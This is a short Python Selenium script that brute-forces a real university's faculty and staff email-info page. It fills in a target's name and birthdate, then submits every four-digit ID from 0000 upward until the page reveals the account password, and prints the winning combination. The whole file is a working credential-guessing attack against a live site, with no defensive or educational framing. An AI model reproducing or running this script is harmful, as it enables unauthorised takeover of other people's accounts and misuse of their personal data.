from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException

browser = webdriver.Firefox() # Get local session of firefox
browser.get("https://emailinfo.ccny.cuny.edu/facultystaff.php")

finput = str(raw_input("Firstname: "))
linput = str(raw_input("Lastname: "))
dinput = str(raw_input("Birthdate: "))

firstname = browser.find_element_by_name("firstname")
firstname.send_keys(finput);
lastname = browser.find_element_by_name("lastname")
lastname.send_keys(linput)
dob = browser.find_element_by_name("dob")
dob.send_keys(dinput)

iddigit = browser.find_element_by_name("iddigits")
combination = 0
result = str(combination).zfill(4)
iddigit.send_keys(result)

submit = browser.find_element_by_name("submit")
submit.click()

while (1):
    try:
        browser.find_element_by_name("mypassword")
        result= str(combination).zfill(4)   #print password
        print "FOUND!!! Combination is: " + result
        break
    except NoSuchElementException: #wrong password
        print result + " = Wrong password."
        back = browser.find_element_by_xpath("//a[contains(@href, 'javascript:history.go(-1)')]")
        back.click()
        combination += 1
        result = str(combination).zfill(4)
        iddigit = browser.find_element_by_name("iddigits")
        iddigit.send_keys(result)
        submit = browser.find_element_by_name("submit")
        submit.click()